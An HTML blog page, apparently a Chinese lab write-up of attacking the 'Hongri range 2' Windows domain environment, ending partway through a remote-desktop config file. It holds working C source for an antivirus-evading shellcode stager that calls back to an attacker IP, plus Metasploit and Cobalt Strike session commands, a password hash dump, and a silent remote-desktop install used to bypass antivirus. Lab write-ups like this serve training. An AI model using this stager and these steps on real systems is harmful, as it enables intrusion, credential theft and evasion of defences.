@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicons/favicon-16x16.png">
+  <link rel="mask-icon" href="/image/favicons/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"paoka1.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="红日靶场二的流程笔记 本文详细记录了对红日靶场二的渗透过程，包括外网打点、内网横移、权限维持等 文章说明环境说明：  环境搭建部分不介绍 在打靶场前我已经在这个靶场做过很多攻击测试，在某些地方可能会和原版靶场不同 因为环境不同，可能某些攻击无法在原本靶场复现  网络配置：  10.10.10.xxx（不可访问外网）：DC、PC、WEB 192.168.12.xxx（可访问外网）：PC、WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场二笔记">
+<meta property="og:url" content="https://paoka1.top/2023/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Paoka1&#39;s Blog">
+<meta property="og:description" content="红日靶场二的流程笔记 本文详细记录了对红日靶场二的渗透过程，包括外网打点、内网横移、权限维持等 文章说明环境说明：  环境搭建部分不介绍 在打靶场前我已经在这个靶场做过很多攻击测试，在某些地方可能会和原版靶场不同 因为环境不同，可能某些攻击无法在原本靶场复现  网络配置：  10.10.10.xxx（不可访问外网）：DC、PC、WEB 192.168.12.xxx（可访问外网）：PC、WEB">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/01.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/03.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/02.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/04.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/05.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/06.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/07.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/08.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/09.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/10.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/11.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/12.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/13.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/14.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/15.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/16.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/17.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/18.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/19.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/20.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/21.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/22.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/23.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/24.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/25.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/26.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/27.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/28.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/29.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/30.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/31.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/32.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/33.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/34.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/35.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/36.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/10/37.png">
+<meta property="article:published_time" content="2023-10-22T13:12:47.000Z">
+<meta property="article:modified_time" content="2026-01-04T12:31:17.317Z">
+<meta property="article:author" content="Paoka1">
+<meta property="article:tag" content="CobaltStrike">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://paoka1.top/image/post/2023/10/01.png">
+
+
+<link rel="canonical" href="https://paoka1.top/2023/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%E7%AC%94%E8%AE%B0/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://paoka1.top/2023/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%E7%AC%94%E8%AE%B0/","path":"2023/10/22/红日靶场二笔记/","title":"红日靶场二笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>红日靶场二笔记 | Paoka1's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Paoka1's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E7%AB%A0%E8%AF%B4%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">文章说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">Web 主机端口与漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">Web 主机信息收集与渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E7%A7%BB"><span class="nav-number">4.</span> <span class="nav-text">域内横移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">域内权限维持</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paoka1"
+      src="/image/favicons/favicon.ico">
+  <p class="site-author-name" itemprop="name">Paoka1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/paoka1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;paoka1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shauio@163.com" title="E-Mail → mailto:shauio@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://paoka1.top/2023/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/favicons/favicon.ico">
+      <meta itemprop="name" content="Paoka1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="红日靶场二笔记 | Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场二笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-22 21:12:47" itemprop="dateCreated datePublished" datetime="2023-10-22T21:12:47+08:00">2023-10-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-04 20:31:17" itemprop="dateModified" datetime="2026-01-04T20:31:17+08:00">2026-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E7%BA%A2%E9%98%9F/" itemprop="url" rel="index"><span itemprop="name">渗透红队</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>红日靶场二的流程笔记</p>
+<p>本文详细记录了对红日靶场二的渗透过程，包括外网打点、内网横移、权限维持等</p>
+<h3 id="文章说明"><a href="#文章说明" class="headerlink" title="文章说明"></a>文章说明</h3><p>环境说明：</p>
+<ol>
+<li>环境搭建部分不介绍</li>
+<li>在打靶场前我已经在这个靶场做过很多攻击测试，在某些地方可能会和原版靶场不同</li>
+<li>因为环境不同，可能某些攻击无法在原本靶场复现</li>
+</ol>
+<p>网络配置：</p>
+<ol>
+<li><code>10.10.10.xxx</code>（不可访问外网）：DC、PC、WEB</li>
+<li><code>192.168.12.xxx</code>（可访问外网）：PC、WEB</li>
+</ol>
+<span id="more"></span>
+
+<h3 id="Web-主机端口与漏洞"><a href="#Web-主机端口与漏洞" class="headerlink" title="Web 主机端口与漏洞"></a>Web 主机端口与漏洞</h3><p>使用 Nmap 扫描网段发现存活的主机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.130/24 -oA nmapscan/duan</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/01.png" alt="Nmap 扫描"></p>
+<p>存活<code>10.10.10.11</code>，开放<code>80,135,139,445,1433,3389,7001</code>等端口，Nmap 做一下漏洞扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.11 --script=vuln -p 80,135,139,445,1433,3389,7001</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/03.png" alt="Nmap 扫描"></p>
+<p>发现 ms12-020（蓝屏攻击）、ms17-010 等漏洞，但都无法利用，ms17-010 可能需要有效的用户名和凭据，接下来以 Web 为入口点尝试，通过目录扫描在 7001 发现 WebLogic 管理服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.11:7001/console/login/LoginForm.jsp</span><br></pre></td></tr></table></figure>
+
+<p>使用 WeblogicTool_1.2 进行漏洞检查和利用，发现存在 CVE_2020_2551_ECHO，注入哥斯拉内存马，使用哥斯拉连接，拿到 Shell</p>
+<p><img src="/image/post/2023/10/02.png" alt="WeblogicTool_1.2 进行漏洞检查和利用"></p>
+<p><img src="/image/post/2023/10/04.png" alt="WeblogicTool_1.2 进行漏洞检查和利用"></p>
+<p><img src="/image/post/2023/10/05.png" alt="哥斯拉连接内存马"></p>
+<p><img src="/image/post/2023/10/06.png" alt="哥斯拉连接内存马"></p>
+<h3 id="Web-主机信息收集与渗透"><a href="#Web-主机信息收集与渗透" class="headerlink" title="Web 主机信息收集与渗透"></a>Web 主机信息收集与渗透</h3><p>收集一些信息，发现：存在域<code>de1ay.com</code>，本主机名<code>web.de1ay.com</code>，存在两个网卡，<code>192.168.12.161</code>、<code>10.10.10.11</code>，直接上传 cs、msf 的木马，发现不能上线，被数字卫士拦截，用一个 MSF 免杀程序来测试，以下为源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA ws_Data;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws_Data);</span><br><span class="line"></span><br><span class="line">    SOCKET sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    SOCKADDR_IN sock_info = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    sock_info.sin_family = AF_INET;</span><br><span class="line">    sock_info.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.12.135&quot;</span>);</span><br><span class="line">    sock_info.sin_port = htons(<span class="number">9999</span>);</span><br><span class="line">    connect(sock, (SOCKADDR*)&amp;sock_info, <span class="keyword">sizeof</span>(SOCKADDR_IN));</span><br><span class="line"></span><br><span class="line">    DWORD recvSize;</span><br><span class="line">    recv(sock, (<span class="type">char</span>*)&amp;recvSize, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</span><br><span class="line">    PBYTE recbuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, recvSize);</span><br><span class="line">    DWORD recvSize2 = recvSize;</span><br><span class="line">    PBYTE recbuf2 = recbuf;</span><br><span class="line"></span><br><span class="line">    DWORD i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">0</span> &amp;&amp; recvSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        i = recv(sock, (<span class="type">char</span>*)recbuf, recvSize, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 越过第一次接收的数据</span></span><br><span class="line">        recbuf = recbuf + i;</span><br><span class="line">        recvSize = recvSize - i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VirtualProtect(recbuf2, recvSize2, PAGE_EXECUTE_READWRITE, &amp;recvSize);</span><br><span class="line">    __asm__ __volatile__ (</span><br><span class="line">        <span class="string">&quot;movl %0, %%edi \n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;jmp *%1        \n\t&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;r&quot;</span>(sock), <span class="string">&quot;r&quot;</span>(recbuf2)</span><br><span class="line">        : <span class="string">&quot;%edi&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>详见：<a href="https://paoka1.top/2023/06/18/MSF-%E4%B8%8A%E7%BA%BF%E6%8E%A2%E7%A9%B6%E4%B8%8E%E5%85%8D%E6%9D%80/">MSF 上线探究与免杀</a>，但注意上传的目录不对的话会在运行时直接被数字卫士拦截，这里选择<code>C:/Users/de1ay/Desktop/</code>，在 MSF 开启监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LPORT 9999</span><br><span class="line">set LHOST 192.168.12.135</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>在哥斯拉使用以下命令执行木马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start update.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/07.png" alt="上线 MSF"></p>
+<p><img src="/image/post/2023/10/08.png" alt="上线 MSF"></p>
+<p>成功上线 MSF，但需要尽快迁移进程：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看进程</span></span><br><span class="line">ps</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 msf 获取 shell 的进程号</span></span><br><span class="line">getpid</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">迁移进程、512 为 vmtoolsd，较为稳定</span></span><br><span class="line">migrate 512</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/09.png" alt="迁移进程"></p>
+<p>如果想派生到 CS，可以先在 CS 上建立一个反向 HTTP 监听，然后执行下面的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bg</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.12.135</span><br><span class="line">set lport 4446</span><br><span class="line">set DisablePayloadHandler True</span><br><span class="line">set PrependMigrate True</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/post/2023/10/10.png" alt="派生到 CS"></p>
+<p><img src="/image/post/2023/10/11.png" alt="派生到 CS"></p>
+<p><img src="/image/post/2023/10/12.png" alt="派生到 CS"></p>
+<p>就成功上线 CS 了，在 CS 也需要迁移进程，可以使用 CS 进行 Hash 的抓取：</p>
+<p><img src="/image/post/2023/10/13.png" alt="Hash 的抓取"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">de1ay:1000:aad3b435b51404eeaad3b435b51404ee:01c234eb550fca678d3cbf91628c9d2f:::</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br></pre></td></tr></table></figure>
+
+<p>同时可以进行内网的主机存活探测</p>
+<p><img src="/image/post/2023/10/14.png" alt="主机存活探测"></p>
+<p>这里没有开启另一台靶机，所以只有两个，因为我们已经是 SYSTEM 权限，所以无需提权，在做权限维持新建用户的时候被数字卫士拦截，于是想着去关闭数字卫士，使用的方法是通过远控软件进行关闭，这里选择的是 ToDesk，下载地址：<a target="_blank" rel="noopener" href="https://www.todesk.com/download.html%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E7%9A%84">https://www.todesk.com/download.html，将下载的</a> ToDesk 上传至靶机的桌面：</p>
+<p><img src="/image/post/2023/10/15.png" alt="ToDesk 上传至靶机的桌面"></p>
+<p>接着运行下面的命令静默安装：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\de1ay\Desktop\ToDesk_4.7.2.0_xp.exe /S</span><br></pre></td></tr></table></figure>
+
+<p>在靶机上查是否存在以下目录来确定是否安装成功：</p>
+<p><img src="/image/post/2023/10/16.png" alt="确定是否安装成功"></p>
+<p>安装完成后应该会自动启动，若在进程列表里没有找到尝试手动启动，但可能会被数字卫士拦截：</p>
+<p><img src="/image/post/2023/10/17.png" alt="进程列表是否存在 ToDesk"></p>
+<p>抱着模拟真实渗透场景的原则，我们不能直接在靶机上查看 ToDesk 的设备代码和密码，我们需要在下面的文件里读取：</p>
+<p><img src="/image/post/2023/10/18.png" alt="配置文件"></p>
+<p>将文件下载，文件部分内容如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[ConfigInfo]</span></span><br><span class="line"><span class="attr">passUpdate</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">PrivateScreenLockScreen</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">autoLockScreen</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">downloadtimes</span>=<span class="number">202310190</span></span><br><span class="line"><span class="attr">clientId</span>=<span class="number">211237490</span></span><br><span class="line"><span class="attr">PrivateData</span>=<span class="number">93895</span>f59c6346def400fd3292435acdd7ad9d89a9005c91a801d445991abdcd9c1ef</span><br><span class="line">33ef0ef41248349649f1a40f34465deb0f60e255122fcb</span><br><span class="line"><span class="attr">PluginExpiresDays</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">Resolution</span>=<span class="number">1920</span>x1080</span><br><span class="line"><span class="attr">isOpenTempPass</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">updatePassTime</span>=<span class="number">20231019192542</span></span><br><span class="line"><span class="attr">language</span>=<span class="number">936</span></span><br><span class="line"><span class="attr">isAdmissionControl</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">WeakPasswordTip</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">Version</span>=<span class="number">4.7</span>.<span class="number">2.0</span></span><br><span class="line"><span class="attr">isUpdate</span>=<span class="number">0</span></span><br><span class="line"><span 